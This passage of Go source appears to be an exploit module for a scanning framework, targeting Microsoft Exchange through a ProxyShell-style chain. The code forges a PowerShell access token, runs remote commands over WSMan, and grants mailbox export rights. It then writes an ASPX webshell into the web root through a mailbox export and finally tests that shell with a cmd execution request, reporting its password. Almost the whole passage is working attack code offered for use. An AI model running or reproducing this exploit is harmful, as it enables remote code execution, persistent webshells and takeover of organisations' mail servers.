		}
		return output2
	}
	SendPayloadForWsman := func(hostinfo *httpclient.FixUrl, fakeEmail string, Token string, mode string, data string) (string, bool) {
		time.Sleep(500 * time.Millisecond)
		path := fmt.Sprintf("/autodiscover/autodiscover.json?%s/Powershell?X-Rps-CAT=%s&Email=autodiscover/autodiscover.json%%3F%s", fakeEmail, Token, fakeEmail)
		cfg := httpclient.NewPostRequestConfig(path)
		cfg.VerifyTls = false
		cfg.Timeout = 55
		cfg.FollowRedirect = false
		cfg.Header.Store("Content-Type", "application/soap+xml;charset=UTF-8")
		cfg.Data = data
		for i := 0; i < 15; i++ {
			if resp, err := httpclient.DoHttpRequest(hostinfo, cfg); err == nil {
				if resp.StatusCode == 200 {
					if mode == "Create" {
						shellId := regexp.MustCompile(`(?s)<rsp:ShellId>(.*?)</rsp:ShellId>`).FindStringSubmatch(resp.RawBody)[1]
						return shellId, true
					} else if mode == "Receive" {
						if strings.Contains(resp.RawBody, "ReceiveResponse") {
							return "", true
						}
					} else if mode == "ReceiveRes" {
						if strings.Contains(resp.RawBody, "ReceiveResponse") && strings.Contains(resp.RawBody, "rsp:ExitCode") {
							return resp.RawBody, true
						} else {
							return resp.RawBody, false
						}
					} else if mode == "Command" {
						if strings.Contains(resp.RawBody, "<rsp:CommandId>") {
							return "", true
						}
					} else if mode == "Delete" {
						return "", true
					}
				}
			} else {
				fmt.Println("[-] Code != 200")
				break
			}
		}
		return "", false
	}
	autoAttack := func(hostinfo *httpclient.FixUrl, fakeEmail string, Token string, script string) string {
		creatShellXml := GetCreateShellXml(Uuid(), SessionId, ShellId, getCreationXml())
		shellId, _ := SendPayloadForWsman(hostinfo, fakeEmail, Token, "Create", creatShellXml)
		commandId := Uuid()
		defer func() {
			delShellXml := GetDeleteShellXml(Uuid(), SessionId, shellId)
			SendPayloadForWsman(hostinfo, fakeEmail, Token, "Delete", delShellXml)
		}()
		if shellId != "" {
			receiveXml := GetReceiveXml(Uuid(), SessionId, shellId, "", "153600")
			_, ok := SendPayloadForWsman(hostinfo, fakeEmail, Token, "Receive", receiveXml)
			if !ok {
				return ""
			}
			receiveXml = GetReceiveXml(Uuid(), SessionId, shellId, "", "51200")
			_, ok2 := SendPayloadForWsman(hostinfo, fakeEmail, Token, "Receive", receiveXml)
			if !ok2 {
				return ""
			}
			_, ok3 := SendPayloadForWsman(hostinfo, fakeEmail, Token, "Receive", receiveXml)
			if !ok3 {
				return ""
			}
			commandXml := GetCreateCommandXml(Uuid(), SessionId, shellId, commandId, getArgumentsCom(script))
			_, ok4 := SendPayloadForWsman(hostinfo, fakeEmail, Token, "Command", commandXml)
			if !ok4 {
				return ""
			}
			receiveXmlRes := GetReceiveXml(Uuid(), SessionId, shellId, commandId, "51200")
			res, ok5 := SendPayloadForWsman(hostinfo, fakeEmail, Token, "ReceiveRes", receiveXmlRes)
			if !ok5 && len(res) == 0 {
				return ""
			}
			output := ""
			if !ok5 {
				stdoutB64Ary := []string{}
				stdoutB64Ary = append(stdoutB64Ary, res)
				for {
					receiveXmlRes := GetReceiveXml(Uuid(), SessionId, shellId, commandId, "51200")
					resFor, res0k := SendPayloadForWsman(hostinfo, fakeEmail, Token, "ReceiveRes", receiveXmlRes)
					stdoutB64Ary = append(stdoutB64Ary, resFor)
					if res0k {
						break
					}
				}
				for _, stdoutB64 := range stdoutB64Ary {
					output += RegexpStdout(stdoutB64)
				}
				fmt.Println(output)
			} else {
				output = RegexpStdout(res)
				fmt.Println("[+] Output : ", output)
			}
			return output
		}
		return ""
	}
	delEmail := func(hostinfo *httpclient.FixUrl, SID string, EmailId string, fakeEmail string) bool {
		data := `<soap:Envelope
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages"
  xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"
  xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Header>
    <t:RequestServerVersion Version="Exchange2016" />
    <t:SerializedSecurityContext>
      <t:UserSid>%s</t:UserSid>
      <t:GroupSids>
        <t:GroupIdentifier>
          <t:SecurityIdentifier>S-1-5-21</t:SecurityIdentifier>
        </t:GroupIdentifier>
      </t:GroupSids>
    </t:SerializedSecurityContext>
  </soap:Header>
  <soap:Body>
    <m:DeleteItem DeleteType="MoveToDeletedItems">
      <m:ItemIds>
        <t:ItemId %s />
      </m:ItemIds>
    </m:DeleteItem>
  </soap:Body>
</soap:Envelope>`
		data = fmt.Sprintf(data, SID, EmailId)
		data = strings.ReplaceAll(data, "\n", "\r\n")
		path := fmt.Sprintf("/autodiscover/autodiscover.json?a=%s/EWS/Exchange.asmx", fakeEmail)
		cfg := httpclient.NewPostRequestConfig(path)
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		cfg.Header.Store("Content-Type", "text/xml")
		cfg.Header.Store("Cookie", "Email=autodiscover/autodiscover.json?a="+fakeEmail)
		cfg.Data = data
		if resp, err := httpclient.DoHttpRequest(hostinfo, cfg); err == nil && strings.Contains(resp.RawBody, "NoError") {
			return true
		}
		return false
	}
	sendEmail := func(hostinfo *httpclient.FixUrl, SID string, Email string, fakeEmail string, randFix string, randFile string) string {
		data := `<soap:Envelope
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages"
  xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"
  xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Header>
    <t:RequestServerVersion Version="Exchange2016" />
    <t:SerializedSecurityContext>
      <t:UserSid>%s</t:UserSid>
      <t:GroupSids>
        <t:GroupIdentifier>
          <t:SecurityIdentifier>S-1-5-21</t:SecurityIdentifier>
        </t:GroupIdentifier>
      </t:GroupSids>
    </t:SerializedSecurityContext>
  </soap:Header>
  <soap:Body>
    <m:CreateItem MessageDisposition="SaveOnly">
      <m:Items>
        <t:Message>
          <t:Subject>%s</t:Subject>
          <t:Body BodyType="HTML">%s</t:Body>
          <t:Attachments>
            <t:FileAttachment>
              <t:Name>FileAttachment.txt</t:Name>
              <t:IsInline>false</t:IsInline>
              <t:IsContactPhoto>false</t:IsContactPhoto>
              <t:Content>%s</t:Content>
            </t:FileAttachment>
          </t:Attachments>
          <t:ToRecipients>
            <t:Mailbox>
              <t:EmailAddress>%s</t:EmailAddress>
            </t:Mailbox>
          </t:ToRecipients>
        </t:Message>
      </m:Items>
    </m:CreateItem>
  </soap:Body>
</soap:Envelope>`
		randContent := goutils.RandomHexString(10)
		data = fmt.Sprintf(data, SID, randFix, randContent, ShellEncode, Email)
		data = strings.ReplaceAll(data, "\n", "\r\n")
		path := fmt.Sprintf("/autodiscover/autodiscover.json?a=%s/EWS/Exchange.asmx", fakeEmail)
		cfg := httpclient.NewPostRequestConfig(path)
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		cfg.Header.Store("Content-Type", "text/xml")
		cfg.Header.Store("Cookie", "Email=autodiscover/autodiscover.json?a="+fakeEmail)
		cfg.Data = data
		if resp, err := httpclient.DoHttpRequest(hostinfo, cfg); err == nil && strings.Contains(resp.RawBody, "NoError") {
			emailId := regexp.MustCompile(`(?s)<t:ItemId (.*?)/>`).FindStringSubmatch(resp.RawBody)[1]
			return emailId
		}
		return ""
	}
	GetScriptList := func(Email string, randFix string, randFile string) []string {
		var AutoList []string
		alias := strings.Split(Email, "@")[0]
		AutoList = append(AutoList, fmt.Sprintf("New-ManagementRoleAssignment –Role \"Mailbox Import Export\" –User %s", alias))
		AutoList = append(AutoList, fmt.Sprintf("New-MailboxExportRequest -Mailbox %s -IncludeFolders (\"#Drafts#\") -ContentFilter \"(Subject -eq '%s')\" –FilePath \"\\\\127.0.0.1\\C$\\inetpub\\wwwroot\\aspnet_client\\%s\"", alias, randFix, randFile))
		AutoList = append(AutoList, "Get-MailboxExportRequest | Remove-MailboxExportRequest -Confirm:$false")
		return AutoList
	}
	CheckShell := func(hostinfo *httpclient.FixUrl, shellPath string) string {
		cfg := httpclient.NewPostRequestConfig(shellPath)
		cfg.VerifyTls = false
		cfg.Timeout = 30
		cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		cfg.FollowRedirect = false
		cfg.Data = "XxxX=Response.Write(\"aaaaaaaa\"%2b(new+ActiveXObject(\"WSCRIPT.SHELL\").Exec(\"cmd+/c+echo+cccc\").StdOut.ReadAll())%2b\"bbbbbb\");"
		if resp, err := httpclient.DoHttpRequest(hostinfo, cfg); err == nil && strings.Contains(resp.RawBody, "bbbbbb") {
			return hostinfo.FixedHostInfo + shellPath
		}
		return ""
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostinfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			fmt.Println("hello1")
			FakeEmail := getFakeEmail()
			Fqdn := getFqdn(hostinfo, FakeEmail)
			if Fqdn == "" {
				return false
			}
			fmt.Println("[+] FQDN :", Fqdn)
			Email, LegacyDN := getLegacydn(hostinfo, FakeEmail, Fqdn)
			if LegacyDN == "" {
				return false
			}
			fmt.Println("[+] Use Email :", Email)
			fmt.Println("[+] Legacydn :", LegacyDN)
			sid := getSid(hostinfo, LegacyDN, FakeEmail)
			if sid == "" {
				return false
			}
			fmt.Println("[+] Sid :", sid)
			token := getToken(Email, sid)
			if checkToken(hostinfo, token, FakeEmail) {
				return true
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			FakeEmail := getFakeEmail()
			hostinfo := expResult.HostInfo
			Fqdn := getFqdn(hostinfo, FakeEmail)
			if Fqdn == "" {
				return expResult
			}
			fmt.Println("[+] FQDN1 :", Fqdn)
			Email, LegacyDN := getLegacydn(hostinfo, FakeEmail, Fqdn)
			if LegacyDN == "" {
				return expResult
			}
			fmt.Println("[+] Use Email :", Email)
			fmt.Println("[+] Legacydn :", LegacyDN)
			sid := getSid(hostinfo, LegacyDN, FakeEmail)
			if sid == "" {
				return expResult
			}
			fmt.Println("[+] Sid :", sid)
			token := getToken(Email, sid)
			if !checkToken(hostinfo, token, FakeEmail) {
				return expResult
			}
			mode := stepLogs.Params["Mode"].(string)
			if strings.Contains(mode, "Exec_Ps") {
				cmd := stepLogs.Params["Exec"].(string)
				output := autoAttack(hostinfo, FakeEmail, token, cmd)
				if output != "" {
					expResult.Success = true
					expResult.Output = output
				}
			} else if strings.Contains(mode, "GetShell") {
				fmt.Println("GetShell")
				randFix := goutils.RandomHexString(16)
				randFile := goutils.RandomHexString(5) + ".aspx"
				emailId := sendEmail(hostinfo, sid, Email, FakeEmail, randFix, randFile)
				if emailId == "" {
					expResult.Output = "Send Email Failed"
					return expResult
				}
				defer func() {
					delEmail(hostinfo, sid, emailId, FakeEmail)
					fmt.Println("[+] 删除成功")
				}()
				scriptList := GetScriptList(Email, randFix, randFile)
				output := ""
				fmt.Println("[+] 执行 : ", scriptList[0])
				output = autoAttack(hostinfo, FakeEmail, token, scriptList[0]) + "\n"
				pathList := []string{
					"/aspnet_client/",
					"/owa/auth/",
					"/owa/auth/Current/",
					"/owa/auth/Current/scripts/",
					"/owa/auth/Current/scripts/premium/",
					"/owa/auth/Current/themes/",
					"/owa/auth/Current/themes/resources/",
				}
				shellPath := ""
				for i, script := range scriptList[1 : len(scriptList)-1] {
					fmt.Println("[+] 执行 : ", script)
					output = autoAttack(hostinfo, FakeEmail, token, script) + "\n"
					if !strings.Contains(output, "PST file") {
						shellPath = pathList[i] + randFile
						break
					}
					if !strings.Contains(output, "Error") {
						shellPath = pathList[i] + randFile
						break
					}
				}
				fmt.Println("[+] 执行 : ", scriptList[len(scriptList)-1])
				output = autoAttack(hostinfo, FakeEmail, token, scriptList[len(scriptList)-1]) + "\n"
				fmt.Println("[+] 检查 webshell :\n")
				time.Sleep(10 * time.Second)
				shell := CheckShell(hostinfo, shellPath)
				if len(shell) != 0 {
					if output != "" {
						expResult.Success = true
						expResult.Output = output
						expResult.Output += "Webshell :" + shell + "\n"
						expResult.Output += "Password : XxxX"
					}
				}
			}
			return expResult
		},
	))
}
